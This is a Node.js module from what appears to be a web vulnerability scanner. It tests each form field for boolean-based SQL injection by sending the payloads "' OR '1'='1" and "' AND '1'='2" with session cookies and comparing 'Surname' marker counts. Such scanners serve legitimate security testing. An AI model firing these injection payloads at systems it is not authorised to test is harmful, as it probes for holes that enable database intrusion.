const axios = require('axios');
const payloads = require('../payloads/sqli-payloads.json');

class SQLInjectionProbe {
  constructor() {
    this.timeout = 20000;
  }

  async test(forms, options = {}) {
    const timeout = options.timeout || this.timeout;
    const cookies = options.cookies || {};
    const startTime = Date.now();
    const findings = [];
    console.log(`SQLi probe testing ${forms.length} forms...`);
    
    for (const form of forms) {
      if (Date.now() - startTime > timeout) break;
      for (const input of form.inputs) {
        if (['submit', 'button', 'image', 'reset'].includes(input.type)) continue;
        try {
          const booleanFinding = await this.testBooleanBased(form, input, cookies);
          if (booleanFinding) {
            findings.push(booleanFinding);
          }
        } catch (error) {
          console.error(`Error testing ${input.name}:`, error.message);
        }
      }
    }
    console.log(`✓ SQLi probe complete: ${findings.length} findings`);
    return findings;
  }

  async testBooleanBased(form, input, cookies) {
    console.log(`  Testing ${input.name} for boolean-based SQLi...`);

    const baseline = await this.makeRequest(form, { [input.name]: '1' }, cookies);
    if (baseline.error) return null;

    const truePayload = "' OR '1'='1";
    const falsePayload = "' AND '1'='2";

    // Run TRUE twice for consistency
    const true1 = await this.makeRequest(form, { [input.name]: truePayload }, cookies);
    if (true1.error) return null;
    const true2 = await this.makeRequest(form, { [input.name]: truePayload }, cookies);
    if (true2.error) return null;

    // Run FALSE twice for consistency
    const false1 = await this.makeRequest(form, { [input.name]: falsePayload }, cookies);
    if (false1.error) return null;
    const false2 = await this.makeRequest(form, { [input.name]: falsePayload }, cookies);
    if (false2.error) return null;

    // Average marker counts
    const baselineMarkers = this.countMarker(baseline.body, 'Surname');
    const trueMarkers = Math.round((this.countMarker(true1.body, 'Surname') + this.countMarker(true2.body, 'Surname')) / 2);
    const falseMarkers = Math.round((this.countMarker(false1.body, 'Surname') + this.countMarker(false2.body, 'Surname')) / 2);

    console.log(`    Baseline: ${baselineMarkers}, True (avg): ${trueMarkers}, False (avg): ${falseMarkers}`);

    const deltaTrue = trueMarkers - baselineMarkers;
    const deltaFalse = baselineMarkers - falseMarkers;

    if (deltaTrue >= 2 && deltaFalse >= 1 && trueMarkers > falseMarkers) {
      console.log('    ✓ Boolean-based SQLi detected (verified with 2-run consistency)!');
      return {
        type: 'SQL_INJECTION',
        targetUrl: form.action,
        vulnerableParameter: input.name,
        testPayload: truePayload,
        detectionMethod: 'boolean_based',
        confidence: 0.85,
        evidence: `Boolean SQLi (verified 2x): Baseline=${baselineMarkers}, TRUE=${trueMarkers} (+${deltaTrue}), FALSE=${falseMarkers} (-${deltaFalse})`,
        httpMethod: form.method,
        statusCode: true1.status,
        verified: true
      };
    }

    return null;
  }

  countMarker(text, marker) {
    const regex = new RegExp(marker, 'gi');
    const matches = text.match(regex);
    return matches ? matches.length : 0;
  }

  async makeRequest(form, data, cookies) {
    try {
      const cookieString = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
      const config = {
        method: form.method.toLowerCase(),
        url: form.action,
        timeout: 8000,
        validateStatus: () => true,
        maxRedirects: 0,
        headers: cookieString ? { 'Cookie': cookieString } : {}
      };

      if (form.method.toUpperCase() === 'GET') {
        config.params = { ...data, Submit: 'Submit' };
      } else {
        config.data = new URLSearchParams(data).toString();
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      }

      const response = await axios(config);
      return {
        status: response.status,
        body: typeof response.data === 'string' ? response.data : JSON.stringify(response.data)
      };
    } catch (error) {
      return { status: 0, body: '', error: error.message };
    }
  }
}

module.exports = new SQLInjectionProbe();
